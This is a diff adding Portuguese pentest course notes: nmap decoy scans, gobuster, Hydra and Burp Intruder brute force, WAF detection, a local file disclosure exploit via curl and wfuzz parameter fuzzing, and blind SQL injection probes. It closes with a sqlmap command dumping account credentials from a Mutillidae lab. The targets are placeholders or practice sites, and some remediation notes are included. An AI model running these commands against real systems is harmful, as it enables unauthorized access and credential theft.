@@ -1,0 +1,140 @@
+############################
+## FASE DE RECONHECIMENTO ##
+############################
+
+# Dicas
+# Com o comandos script tudo que vc digitar no terminal após dar enter no comandos é jogado para um arquivo chamado d1-mapear-hosts
+script d1-mapear-hosts
+
+###################
+# MAPEANDO HOSTS ##
+###################
+
+nmap -D RND:20 --open -sS --top-ports=100 urlAqui.com -oN portas-abertas.txt
+# RND:20 -> Cria end ip Randomicos
+# sS SYN SCAN
+
+# Versão dos serviços encontrados em cada porta
+nmap--open -sV -p80,2121 urlAqui.com -oN portas-abertas.txt
+
+
+
+#################################################
+## Enumerando diretorios pela url com GOBUSTER ## 
+#################################################
+gobuster dir -u http://urlAqui.com -w /usr/share/dirb/wordlists/big.txt -t 100 -e --no-error -r -o gobuster.txt
+
+# focando para arquivos com extenções que quisermos
+gobuster dir -u http://urlAqui.com -w /usr/share/dirb/wordlists/big.txt -t 100 -e --no-error -r -o gobuster.txt -x php,bkp,old,txt,xml
+
+-t 100 usa 100 Threads
+-e opção extendida, retorna url completa 
+--no-error não retornar erro na tela
+-r para seguir redirecionamentos
+-x passar extenções de arquivos
+
+
+
+###########################
+## BRUTE FORCE COM HYDRA ##
+###########################
+# Teste de Brute Force com Hydr4
+hydra -v -t 10 -l <usuario> -P senhas.txt ftp://dominio.com.br -s <porta>
+
+-v Verbose
+-t Threads
+-l usuario 	(-L para wordlist de usuarios)
+-p senha 	(-P para wordlist de senhas)
+-s porta 	(especifica um porta caso n seja a porta padrao do protocolo)
+
+##################
+### BurpSuite  ###
+##################
+vou em proxy > intercept clico em "intercept is off" para umar para "intercept is on". vou em OpenBrowser, coloco a url deu uma pagina com login e tento logar.
+
+O Burp vai interceptar e vc vai conseguir ver quais campos ele passa para tentar validar o acesso. 
+
+em HTTP history va no fonte que faz a validação propriamente dita clica nela. depois da um direto e "Send to Intruder"
+
+Ir no menu Intruder ao lado de Proxy. vai estar selecionado campos que vc pode manipular antes para modificar e testar. 
+
+ir por exempo no campo password e remover o texto e deixar somente o simbolo ou vc pode ir e dar um clear que vai limpar todos os campos que estão selecionados.
+
+mas na opção anterior segnifica que estamos marcando esse campo para usarmos como paramentro para passar a wordlist. 
+
+ir em payloads.
+	Payload type: Runtime file
+	select file: UP sua wordlist
+
+em options
+	ir em grep. dar um clear
+	colocar um valor de retorno para filtrar e depois em Add
+	Depois Start Attack
+
+
+##############################################################
+## Detectando Web Aplication Firewall - WAF  como o wafw00f ##
+##############################################################
+wafw00f -v https://dominio.com.br
+
+# -v verbose (vv para mais verboso)
+# wafw00f -l para listar os WAF que ele reconhece
+
+
+#######################################
+## Identificando Tecnologias no site ##
+#######################################
+whatweb dominio.com.br
+
+http://testphp.vulnweb.com/signup.php
+
+
+#################################################
+## Vulnerabilidade LFD - Local File Disclosure ##
+#################################################
+
+No exemplo do curso foi encontrato um fonte download.php com parametro 'file' que permite fazer download que arquivos.
+Abaixo mostra a forma que esse paramentro foi encontrado e como foi explorado para poder baixar arquivos php do servidor.
+Falha CRITICA e que atravez dela foi possivel baixar o fonte de conexao com o banco de dados do site.
+
+Remediações:	1- Sanitizar o code para impedir que os paramentros possam ser manipulados.
+				2- WAF Web Aplication Firewall (Reduz esse e varios outras vetores de ataques).
+
+# Enumerar fontes
+# Emumeração de paramentros dos fontes
+# Explorada atravez de um paramentro vuneravel que permite baixar o fonte php da pagina.
+
+Exemplo do curso:
+1) apos enumeração de fontes php com GOBUSTER;
+2) criar arquivo paramentros.txt que contem por exemplo 'page, url, pg, file, files, arquivos, id'
+3) teste pelo shell:
+for i in $(cat parametros.txt); do curl http://dominio.com.br/algumfonte.php\?$i=oMesmoFonteouOutroQualquer.php; done
+se conseguir baixar o fonte real Vunerabilidade Explorara :)
+
+]
+
+Agora usando o WFUZZ para fazer a msm coisa:
+apt install seclist # Caso n tenha ou baixar do github
+cp /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt lista-paramentros.txt
+
+wfuzz -c -z file,lista-paramentros.txt --hl 0 http://dominio.com.br/algumfonte.php?FUZZ=oMesmoFonteouOutroQualquer.php
+
+-c 	# color
+-z file,lista-paramentros.txt # informa que vai passar um arquivo. e passa o arquivo depois da virgula.
+FUZZ # é onde ele vai jogar o paramentro
+--hl 0 # Esconde se o retorno der como linha zerada (hide line)
+
+
+###################
+## SQL Injection ##
+###################
+
+Validando Blind SQL Injection.
+É quando não mostra no site um erro tipo de sql mas ainda sim é vuneravel a sql injection
+Exemplos: (Se o site funcionar normalmente sem error = possivel que seja vuneravel)
+http://domain.com.br/produtos.php=864 and 5=5#
+http://domain.com.br/produtos.php=864 and length(database()) = 5# 		# se o tamanho dos caracterias do nome da base de dados no bando é igual a 5
+
+sqlmap -u "http://10.0.0.1/mutillidae/index.php?page=user-info.php&username=admin&password=123456&user-info-php-submit-button=View+Account+Details" \
+ --batch --dbms mysql --os linux \
+ --threads 3 -D mutillidae -T accounts -C "username,password,is_admin" --dump
